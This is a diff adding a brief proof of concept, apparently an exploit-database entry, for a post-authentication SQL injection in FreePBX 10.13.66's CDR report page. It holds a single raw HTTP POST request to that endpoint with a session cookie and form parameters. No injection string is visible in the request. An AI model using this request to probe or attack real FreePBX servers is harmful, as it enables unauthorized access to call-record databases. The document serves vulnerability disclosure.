@@ -1,0 +1,24 @@
+; Postauth SQLi bug for FreePBX: 10.13.66-32bit
+; by code610
+
+
+POST /admin/config.php?display=cdr HTTP/1.1
+Host: 192.168.1.11
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,pl;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 477
+Referer: http://192.168.1.11/admin/config.php?display=cdr
+Cookie: lang=en_US; searchHide=1; _ga=GA1.1.1787595604.1517066857; _gid=GA1.1.1984688337.1517066857; PHPSESSID=kurf57stfeja4u8o86grbbj100
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+order=calldate&startday=01&startmonth=01&startyear=2018&starthour=00&startmin=00&endday=31&endmonth=01&endyear=2018&endhour=23&endmin=59&need_html=true&limit=100&cnum=&cnum_mod=begins_with&cnam=&cnam_mod=begins_with&outbound_cnum=&outbound_cnum_mod=begins_with&did=&did_mod=begins_with&dst=&dst_mod=begins_with&dst_cnam=&dst_cnam_mod=begins_with&userfield=&userfield_mod=begins_with&accountcode=&accountcode_mod=begins_with&dur_min=&dur_max=&disposition=all&sort=DESC&group=day
+
+
+; more: code610 blogspot com
+; 
+; o/
+
